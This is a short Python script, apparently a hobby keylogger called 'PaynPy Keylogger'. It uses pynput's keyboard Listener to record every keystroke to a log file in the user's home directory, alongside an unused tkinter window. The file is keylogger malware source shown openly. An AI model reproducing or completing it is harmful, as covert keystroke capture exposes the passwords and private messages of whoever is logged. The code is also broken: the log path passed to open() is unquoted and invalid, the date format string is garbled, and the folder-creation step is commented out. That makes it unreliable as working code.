import tkinter as tk
from tkinter import ttk
from pynput.keyboard import Listener
from tkinter import *
import tkinter.font as tkFont
from tkinter.ttk import *
from time import *
from datetime import *
import os
import getpass
import psutil

# Tkinter Variables
frame = tk.Tk()
frame.geometry("700x500")

# User Variables
username = getpass.getuser()
logdate = datetime.today().strftime('%Y-&MM-&DD-%H:%M:%S')

# Path Variables

directory = "paynpykeylogger"

parent_dir = "/home/" + username + "/"

path = os.path.join(parent_dir, directory)
## if (os.path.exists(parent_dir + directory)):
##    os.mkdir(path) 




logfile = open(~/Documents/PaynPy\ Keylogger\ V2/Log\ Files/logdate, "w+")

def on_press(key):
    while True:
        logfile.write(str(key))
        break



with Listener(on_press=on_press) as listener:
    listener.join()




frame.mainloop()
